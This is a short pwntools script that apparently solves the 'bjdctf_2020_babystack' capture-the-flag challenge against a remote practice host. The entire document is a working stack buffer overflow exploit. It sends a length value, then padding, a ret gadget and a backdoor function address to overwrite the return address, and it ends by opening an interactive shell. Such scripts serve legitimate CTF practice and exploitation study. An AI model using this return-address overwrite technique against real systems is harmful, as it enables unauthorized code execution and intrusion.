from pwn import *

context.log_level = 'debug'

#p = process('./bjdctf_2020_babystack')
p = remote('node3.buuoj.cn',27983)

backdoor_addr = 0x4006e6
ret_addr = 0x400561

p.recvuntil('name:\n')

payload = b'a' * ( 0x10 + 8 ) + p64(ret_addr) + p64(backdoor_addr)
p.sendline(str(len(payload)))

p.recvuntil('name?\n')

p.sendline(payload)

p.interactive()
